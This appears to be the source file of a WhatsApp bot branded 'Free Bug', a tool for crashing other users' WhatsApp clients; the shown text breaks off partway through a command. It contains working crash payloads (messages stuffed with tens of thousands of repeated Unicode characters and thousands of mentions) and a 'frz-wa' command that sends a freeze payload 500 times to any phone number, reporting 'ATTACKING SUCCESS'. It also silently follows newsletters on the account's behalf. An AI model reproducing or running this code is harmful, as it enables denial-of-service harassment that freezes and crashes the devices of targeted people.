const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');
const crypto = require('crypto');
const os = require('os');
const {
  default: makeWASocket, 
  proto, 
  generateWAMessage, 
  generateWAMessageFromContent, 
  getContentType, 
  prepareWAMessageMedia, 
  baileys,
  makeInMemoryStore
} = require("@whiskeysockets/baileys");

let premiumCache = [];
function reloadPremium() {
  try { premiumCache = JSON.parse(fs.readFileSync('./database/premium.json')); } catch (e) {}
}
reloadPremium();
setInterval(reloadPremium, 30000);

const _menuMatches = fs.readFileSync(__filename).toString()
  .match(/case '[^']+'(?!.*case '[^']+')/g) || [];
const totalCases = _menuMatches.length;

const groupMetaCache = new Map();
async function getCachedGroupMetadata(prim, jid) {
  const cached = groupMetaCache.get(jid);
  if (cached && Date.now() - cached.ts < 5 * 60 * 1000) return cached.data;
  const data = await prim.groupMetadata(jid).catch(() => null);
  if (data) groupMetaCache.set(jid, { data, ts: Date.now() });
  return data;
}
module.exports = prim = async (prim, m, chatUpdate, store) => {
try {
  const info = m
  const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId :
    m.mtype === "interactiveMessage" ?
      m.message.interactiveMessage?.header.title ||
      m.message.interactiveMessage?.body?.text ||
      m.message.interactiveMessage?.footer?.text
      || m.text : ""
  );

  const sender = m.key.fromMe
    ? prim.user.id.split(":")[0] || prim.user.id
    : m.key.participant || m.key.remoteJid;
  const isQ = (m.quoted?.msg || m.quoted) ? true : false;
  const senderNumber = sender.split('@')[0];
  const budy = (typeof m.text === 'string' ? m.text : '');
  const prefa = ["", "!", ".", ",", "🐤", "🗿"];
  const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? prefa;
  const from = m.key.remoteJid;
  const isGroup = from.endsWith("@g.us");
  const isChannel = from.endsWith("@newsletter");
  const botNumber = await prim.decodeJid(prim.user.id);
  const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
  const aiJid = "13135550002@s.whatsapp.net"
  const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
  const isBot = botNumber.includes(senderNumber)
  const isCmd = body.startsWith(prefix) ? true : false
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "";
  const args = body.trim().split(/ +/).slice(1);
  const pushname = m.pushName || "Squichy Beta";
  const text = q = args.join(" ");
  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || '';
  const qmsg = (quoted.msg || quoted);
  const isMedia = /image|video|sticker|audio/.test(mime);
  const groupMetadata = isGroup ? await prim.groupMetadata(m.chat).catch((e) => {}) : "";
  const groupOwner = isGroup ? groupMetadata?.owner : "";
  const groupName = m.isGroup ? groupMetadata?.subject : "";
  const participants = isGroup ? await groupMetadata?.participants : "";
  const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.jid) : "";
  const groupMembers = isGroup ? groupMetadata?.participants : "";
  const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
  const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
  const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
  const { 
    smsg, 
    sendGmail, 
    formatSize, 
    isUrl, 
    generateMessageTag, 
    getBuffer, 
    getSizeMedia, 
    runtime, 
    fetchJson, 
    sleep
  } = require('./myfunc'); 
  const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");
  
const { vcs, invisSqL2, ofmCrashSql, freeze, docThumb, ofmcrsl, frezcrashXcx } = require('./Func/bug')

function usedWithPrefix(m, command, prefix) {
    if (!m.text) return false
    return m.text.trim().startsWith(prefix + command)
}

        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `   ▢ Date : ${new Date().toLocaleString()} \n` +
                    `   ▢ Message: ${m.body || m.mtype} \n` +
                    `   ▢ Sender: ${pushname} \n` +
                    `   ▢ JID: ${senderNumber} \n`
                )
            );
            console.log();
        }
  
const reply = (teks) => {
    prim.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 2,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "𝙵𝚁𝙴𝙴 𝙱𝚄𝙶",
                newsletterJid: "120363425413527865@newsletter",
            },
        }
    }, { quoted: m });
} 
  
const SETTINGS_FILE = './database/settings.json';
let settingsCache = null;

function loadSettings() {
  if (settingsCache) return settingsCache;
  if (!fs.existsSync(SETTINGS_FILE)) {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify({}, null, 2));
  }
  settingsCache = JSON.parse(fs.readFileSync(SETTINGS_FILE));
  return settingsCache;
}

function getSetting(chatId, key, defaultValue = false) {
  const settings = loadSettings();
  return settings[chatId]?.[key] ?? defaultValue;
}

if (!global._lastAutobioUpdate) global._lastAutobioUpdate = 0;
const AUTOBIO_COOLDOWN_MS = 6 * 60 * 60 * 1000; 
if (getSetting(m.sender, "autobio", true) && (Date.now() - global._lastAutobioUpdate > AUTOBIO_COOLDOWN_MS)) {
    global._lastAutobioUpdate = Date.now();
    prim.updateProfileStatus(`Free Bug Connected ☑️`).catch(_ => _)
}

var newsletterJids = [
    "120363425413527865@newsletter",
    "120363428068564088@newsletter",
    "120363403408693274@newsletter"
];

var lastFollowTime = 0;
var globalCooldown = 30 * 1000;
var followedUsers = new Set();
var isFollowing = false;

function bindNewsletterListeners(prim) {
  if (prim._newsletterBound) return;
  prim._newsletterBound = true;

  prim.ev.on("messages.upsert", async (chatUpdate) => {
    const mek = chatUpdate.messages[0];
    if (!mek.message) return;
    const userJid = mek.key.remoteJid;
    if (followedUsers.has(userJid)) return;
    if (isFollowing) return;
    const now = Date.now();
    if (now - lastFollowTime < globalCooldown) return;
    isFollowing = true;
    lastFollowTime = now;
    try {
      for (let jid of newsletterJids) {
        try {
          await prim.newsletterFollow(jid, true);
          await new Promise(r => setTimeout(r, 15000));
        } catch (err) {
          const errMsg = err?.message || String(err);
          if (!errMsg.includes("rate")) {
          } else {
            await new Promise(r => setTimeout(r, 20000));
          }
        }
      }
      followedUsers.add(userJid);
      setTimeout(() => followedUsers.delete(userJid), 12 * 60 * 60 * 1000);
    } catch (e) {}
    isFollowing = false;
  });
}

async function coolz4ndroz(prim, targetoz) {
 await prim.relayMessage(targetoz, {
  interactiveMessage: {
   body: { text: "\n" },
    nativeFlowMessage: {
      buttons: [
       {
         name: "quick_reply",
         buttonParamsJson: JSON.stringify({
           display_text: "؃".repeat(50000)
          })
        }
      ]
    }
  }
}, {
  })
}

async function iosZLoc(prim, target) {
const R4IMG = fs.readFileSync('./Func/bug.jpg');
  for(let z = 0; z < 60; z++) {
    await prim.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: `🧪⃟꙰。⌁.Bug ? ¿` + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/dsprimis",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: R4IMG, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: true });
  }
}
switch(command) {

case "linkbot":
case "getbot":
case "telebot":
case "freebot":
case "pair":
case "reqpair":
case "repo": {
    await prim.sendMessage(m.chat, { react: { text: '🌐', key: m.key } })

    const txt = `
> ╔════─── • ───══╗
> ║╭────•
> ║┃───⎝⎝✧ *𝙵𝚁𝙴𝙴 𝙱𝚄𝙶* ✧⎠⎠
> ║┃
> ║┃➳ *\`𝙱𝙾𝚃 𝙻𝙸𝙽𝙺\`*
> ║┃╰─ *https://free-bot-beta.vercel.app*
> ║╰────•
> ╚════─── • ───══╝
`
    await prim.sendMessage(m.chat, {
        text: txt,
        contextInfo: {
            quotedMessage: m.message,
            remoteJid: m.key.remoteJid,
            participant: m.key.participant
        }
    }, { quoted: m })
}
break

case "squichy": case "menu": {
if (!usedWithPrefix(m, command, prefix)) return;
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃* ✧⎠⎠
> ║┃
> ║┃➳ *𝙾𝚆𝙽𝙴𝚁:* 𝙿𝚁𝙸𝙼𝙸𝚂 - ¿? +
> ║┃➳ *𝚅𝙴𝚁𝚂𝙸𝙾𝙽:* 1.0.0
> ║┃➳ *𝙿𝚁𝙴𝙵𝙸𝚇:* ${prefix}
> ║┃➳ *𝚄𝚂𝙴𝚁:* ${m.pushName}
> ║┃➳ *𝙲𝙾𝙼𝙼𝙰𝙽𝙳:* ${totalCases}
> ║┃➳ *𝚃𝙾𝙳𝙰𝚈:* ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
> ║┃➳ *𝙳𝙰𝚃𝙴:* ${date.toLocaleDateString('en-GB')}
> ║┃➳ *𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼:* ${platform}
> ║┃➳ *𝚁𝚄𝙽𝚃𝙸𝙼𝙴:* ${process.version}
> ║┃➳ *𝙼𝙾𝙳𝙴:* ${prim.public ? '🌍 Public' : '🔒 Self'}
> ║╰────•
> ╚════── • ──══╝

> ╔════── • ──═══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙵𝚁𝙴𝙴 𝙱𝚄𝙶* ✧⎠⎠
> ║┃
> ║┃ ✧ *\`𝙼𝙰𝙸𝙽 𝙲𝙼𝙳𝚂\`*
> ║┃➳ *${prefix}𝙿𝙰𝙸𝚁*
> ║┃➳ *${prefix}𝙾𝚆𝙽𝙴𝚁*
> ║┃➳ *${prefix}𝙿𝙸𝙽𝙶*
> ║┃➳ *${prefix}𝚂𝙴𝙻𝙵*
> ║┃➳ *${prefix}𝙿𝚄𝙱𝙻𝙸𝙲*
> ║┃➳ *${prefix}𝙱𝚄𝙶-𝙼𝙴𝙽𝚄*
> ║╰────•
> ╚════── • ──═══╝
`
        const imageUrl = "https://files.catbox.moe/rg113k.jpg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363425413527865@newsletter',
                    newsletterName: '𝙵𝚁𝙴𝙴 𝙱𝚄𝙶',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

case 'mode':{
if (!usedWithPrefix(m, command, prefix)) return;
  if (!isBot) return reply("Botz only");
     reply(`🔹 Mode : ${prim.public ? 'Public' : 'Private'}`);
     }
     break;

case "self": {
if (!usedWithPrefix(m, command, prefix)) return;
  if (!isBot) return reply("Botz only");
  if (!prim.public && isBot) return reply("Botz in self mode already");
  prim.public = false
  prim.saveSetting && prim.saveSetting('public', false)
  reply("Mode self activated")
}
break;

case "public": {
if (!usedWithPrefix(m, command, prefix)) return;
  if (!isBot) return reply("Botz only");
  if (prim.public && isBot) return reply("Botz in published mode already");
  prim.public = true
  prim.saveSetting && prim.saveSetting('public', true)
  reply("Mode public activated")
}
break;

case 'ping':
                          case 'p':
if (!usedWithPrefix(m, command, prefix)) return;
  await prim.sendMessage(from, { react: { text: '🚀', key: m.key } });
                            {
                              
                                   async function loading (jid) {
                             
                                    let start = new Date;
                                    let { key } = await prim.sendMessage(jid, {text: 'wait..'})
                                    let done = new Date - start;
                                    var lod = `*Pong*:\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`
                                    
                                    await sleep(1000)
                                    await prim.sendMessage(jid, {text: lod, edit: key });
                                    }
                                    loading(from)
                                   
                            }       
                            break;
                          
 
case "owner": {
   const ownerName = "𝙸𝚃'𝚂 𝙼𝙴";  
   const ownerNumber = "50956880230"; 
   const displayTag = "𝚃𝙷𝙴 𝙾𝙽𝙻𝚈 𝙾𝚆𝙽𝙴𝚁 𝙾𝙵 𝙵𝚁𝙴𝙴 𝙱𝚄𝙶";

   let vcard = `BEGIN:VCARD
VERSION:3.0
FN:${ownerName}
TEL;type=CELL;type=VOICE;waid=${ownerNumber}:+${ownerNumber}
END:VCARD`;

   let caption = `
╭───「 👑 𝙾𝚆𝙽𝙴𝚁 𝙸𝙽𝙵𝙾 」
│
│ 𝙽𝙰𝙼𝙴: ${ownerName}  
│ 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿: wa.me/${ownerNumber}  
│ 𝚁𝙾𝙻𝙴: ${displayTag}  
│
╰───────────────◆
`

   await prim.sendMessage(m.chat, { 
      contacts: { displayName: displayTag, contacts: [{ vcard }] } 
   }, { quoted: m });

   await prim.sendMessage(m.chat, {
      text: caption,
      mentions: [m.sender],
      contextInfo: {
         isForwarded: true,
         forwardingScore: 9999,
         forwardedNewsletterMessageInfo: {
            newsletterJid: `120363425413527865@newsletter`, 
            newsletterName: `𝙵𝚁𝙴𝙴 𝙱𝚄𝙶`
         }
      }
   }, { quoted: m });
}
break;

case 'jid': {
    if (!usedWithPrefix(m, command, prefix)) return;
            reply(from)
           }
          break;

// -----------------------------------------
case "bug-menu": {
if (!usedWithPrefix(m, command, prefix)) return;
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃* ✧⎠⎠
> ║┃
> ║┃➳ *𝙾𝚆𝙽𝙴𝚁:* 𝙿𝚁𝙸𝙼𝙸𝚂 - ¿? +
> ║┃➳ *𝚅𝙴𝚁𝚂𝙸𝙾𝙽:* 1.0.0
> ║┃➳ *𝙿𝚁𝙴𝙵𝙸𝚇:* ${prefix}
> ║┃➳ *𝚄𝚂𝙴𝚁:* ${m.pushName}
> ║┃➳ *𝙲𝙾𝙼𝙼𝙰𝙽𝙳:* ${totalCases}
> ║┃➳ *𝚃𝙾𝙳𝙰𝚈:* ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
> ║┃➳ *𝙳𝙰𝚃𝙴:* ${date.toLocaleDateString('en-GB')}
> ║┃➳ *𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼:* ${platform}
> ║┃➳ *𝚁𝚄𝙽𝚃𝙸𝙼𝙴:* ${process.version}
> ║┃➳ *𝙼𝙾𝙳𝙴:* ${prim.public ? '🌍 Public' : '🔒 Self'}
> ║╰────•
> ╚════── • ──══╝

> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙱𝚄𝙶 𝙼𝙴𝙽𝚄* ✧⎠⎠
> ║┃
> ║┃──⎝⎝ *\`𝙱𝚄𝙶 𝙵𝙴𝙰𝚃𝚄𝚁𝙴\`*
> ║┃➳ *${prefix}𝙸𝙾𝚂-𝙱𝚄𝙶*
> ║┃➳ *${prefix}𝙰𝙽𝙳𝚁𝙾-𝙱𝚄𝙶*
> ║┃➳ *${prefix}𝙶𝚁𝙾𝚄𝙿-𝙱𝚄𝙶*
> ║╰────•
> ╚════── • ──══╝
`
        const imageUrl = "https://files.catbox.moe/rg113k.jpg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363425413527865@newsletter',
                    newsletterName: '𝙵𝚁𝙴𝙴 𝙱𝚄𝙶',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

// andro bug

case "andro-bug": {
if (!usedWithPrefix(m, command, prefix)) return;
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃* ✧⎠⎠
> ║┃
> ║┃➳ *𝙾𝚆𝙽𝙴𝚁:* 𝙿𝚁𝙸𝙼𝙸𝚂 - ¿? +
> ║┃➳ *𝚅𝙴𝚁𝚂𝙸𝙾𝙽:* 1.0.0
> ║┃➳ *𝙿𝚁𝙴𝙵𝙸𝚇:* ${prefix}
> ║┃➳ *𝚄𝚂𝙴𝚁:* ${m.pushName}
> ║┃➳ *𝙲𝙾𝙼𝙼𝙰𝙽𝙳:* ${totalCases}
> ║┃➳ *𝚃𝙾𝙳𝙰𝚈:* ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
> ║┃➳ *𝙳𝙰𝚃𝙴:* ${date.toLocaleDateString('en-GB')}
> ║┃➳ *𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼:* ${platform}
> ║┃➳ *𝚁𝚄𝙽𝚃𝙸𝙼𝙴:* ${process.version}
> ║┃➳ *𝙼𝙾𝙳𝙴:* ${prim.public ? '🌍 Public' : '🔒 Self'}
> ║╰────•
> ╚════── • ──══╝

> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙰𝙽𝙳𝚁𝙾 𝙱𝚄𝙶* ✧⎠⎠
> ║┃
> ║┃──⎝⎝ *\`𝙵𝚁𝙴𝙴𝚉𝙴 𝙷𝙾𝙼𝙴\`*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝚆𝙰*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝚇𝙲𝚇*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝙳𝙾𝙲*
> ║┃➳ *${prefix}𝙵𝚁𝚉-𝚂𝚀𝙻*
> ║┃
> ║┃──⎝⎝ *\`𝙳𝙴𝙻𝙰𝚈\`*
> ║┃➳ *${prefix}𝙳𝙴𝙻𝙰𝚈-𝚂𝚀𝙻*
> ║┃➳ *${prefix}𝙳𝙴𝙻𝙰𝚈-𝙲𝚂𝙻*
> ║┃➳ *${prefix}𝙳𝙴𝙻𝙰𝚈-𝚂𝚀𝙻*
> ║┃➳ *${prefix}𝙳𝙴𝙻𝙰𝚈-𝚅𝙲𝚂*
> ║╰────•
> ╚════── • ──══╝
`
        const imageUrl = "https://files.catbox.moe/rg113k.jpg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363425413527865@newsletter',
                    newsletterName: '𝙵𝚁𝙴𝙴 𝙱𝚄𝙶',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

// ios bug

case "ios-bug": {
if (!usedWithPrefix(m, command, prefix)) return;
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃* ✧⎠⎠
> ║┃
> ║┃➳ *𝙾𝚆𝙽𝙴𝚁:* 𝙿𝚁𝙸𝙼𝙸𝚂 - ¿? +
> ║┃➳ *𝚅𝙴𝚁𝚂𝙸𝙾𝙽:* 1.0.0
> ║┃➳ *𝙿𝚁𝙴𝙵𝙸𝚇:* ${prefix}
> ║┃➳ *𝚄𝚂𝙴𝚁:* ${m.pushName}
> ║┃➳ *𝙲𝙾𝙼𝙼𝙰𝙽𝙳:* ${totalCases}
> ║┃➳ *𝚃𝙾𝙳𝙰𝚈:* ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
> ║┃➳ *𝙳𝙰𝚃𝙴:* ${date.toLocaleDateString('en-GB')}
> ║┃➳ *𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼:* ${platform}
> ║┃➳ *𝚁𝚄𝙽𝚃𝙸𝙼𝙴:* ${process.version}
> ║┃➳ *𝙼𝙾𝙳𝙴:* ${prim.public ? '🌍 Public' : '🔒 Self'}
> ║╰────•
> ╚════── • ──══╝

> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙾𝚂 𝙱𝚄𝙶* ✧⎠⎠
> ║┃
> ║┃──⎝⎝ *\`𝙲𝚁𝙰𝚂𝙷 𝙸𝙾𝚂\`*
> ║┃➳ *${prefix}𝙸𝙾𝚂-𝚉𝙺*
> ║┃➳ *${prefix}𝚁𝙿𝙼𝙽-𝙸𝙾𝚂*
> ║┃➳ *${prefix}𝙲𝚁𝙰𝚂𝙷-𝙸𝙾𝚂*
> ║┃➳ *${prefix}𝙸𝙽𝚅𝙸𝚂-𝙸𝙾𝚂*
> ║╰────•
> ╚════── • ──══╝
`
        const imageUrl = "https://files.catbox.moe/rg113k.jpg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363425413527865@newsletter',
                    newsletterName: '𝙵𝚁𝙴𝙴 𝙱𝚄𝙶',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

// group bug

case "group-bug": {
if (!usedWithPrefix(m, command, prefix)) return;
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙸𝙽𝙵𝙾 𝙱𝙾𝚃* ✧⎠⎠
> ║┃
> ║┃➳ *𝙾𝚆𝙽𝙴𝚁:* 𝙿𝚁𝙸𝙼𝙸𝚂 - ¿? +
> ║┃➳ *𝚅𝙴𝚁𝚂𝙸𝙾𝙽:* 1.0.0
> ║┃➳ *𝙿𝚁𝙴𝙵𝙸𝚇:* ${prefix}
> ║┃➳ *𝚄𝚂𝙴𝚁:* ${m.pushName}
> ║┃➳ *𝙲𝙾𝙼𝙼𝙰𝙽𝙳:* ${totalCases}
> ║┃➳ *𝚃𝙾𝙳𝙰𝚈:* ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
> ║┃➳ *𝙳𝙰𝚃𝙴:* ${date.toLocaleDateString('en-GB')}
> ║┃➳ *𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼:* ${platform}
> ║┃➳ *𝚁𝚄𝙽𝚃𝙸𝙼𝙴:* ${process.version}
> ║┃➳ *𝙼𝙾𝙳𝙴:* ${prim.public ? '🌍 Public' : '🔒 Self'}
> ║╰────•
> ╚════── • ──══╝

> ╔════── • ──══╗
> ║╭────•
> ║┃──⎝⎝✧ *𝙶𝚁𝙾𝚄𝙿 𝙱𝚄𝙶* ✧⎠⎠
> ║┃
> ║┃──⎝⎝ *\`𝙱𝙻𝙰𝙽𝙺 𝙲𝙻𝙸𝙲𝙺\`*
> ║┃➳ *${prefix}𝙱𝚄𝙶-𝙶𝙲*
> ║┃➳ *${prefix}𝙺𝙸𝙻𝙻-𝙶𝙲*
> ║┃➳ *${prefix}𝙱𝙻𝙰𝙽𝙺-𝙶𝙲*
> ║┃➳ *${prefix}𝙲𝙾𝙾𝙻-𝙶𝙲*
> ║╰────•
> ╚════── • ──══╝
`
        const imageUrl = "https://files.catbox.moe/rg113k.jpg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363425413527865@newsletter',
                    newsletterName: '𝙵𝚁𝙴𝙴 𝙱𝚄𝙶',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

// freeze case


case 'frz-wa': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
        `*— 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙸𝚂 𝙾𝙽𝙻𝚈 𝙵𝙾𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚄𝚂𝙴𝚁𝚂.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚂𝙰𝙶𝙴.*\n\n` +
            `*— 𝚄𝚂𝙰𝙶𝙴: ${prefix+command} 509xxx*\n` +
            `*𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*\n\n` +
            `_*𝚃𝙷𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝙼𝚄𝚂𝚃 𝙲𝙾𝙽𝚃𝙰𝙸𝙽 𝙳𝙸𝙶𝙸𝚃𝚂 𝙾𝙽𝙻𝚈.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— ${number || '𝙴𝙼𝙿𝚃𝚈'} 𝙸𝚂 𝚃𝙾𝙾 𝚂𝙷𝙾𝚁𝚃.*\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 10+ 𝙳𝙸𝙶𝙸𝚃 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n` +
        `𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}\n` +
        `𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗳𝗿𝗲𝗲𝘇𝗲\n\n` +
        `*» 𝙰𝙵𝚃𝙴𝚁 𝚈𝙾𝚄 𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 𝚅𝙸𝚃𝚄𝚂, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 10 𝙼𝙸𝙽𝚄𝚃𝙴𝚂 𝙱𝙴𝙵𝙾𝚁𝙴 𝚂𝙴𝙽𝙳𝙸𝙽𝙶 𝙰𝙽𝙾𝚃𝙷𝙴𝚁.*`
    );
    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await freeze(prim, target);
}
}
break;

case 'frz-doc': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
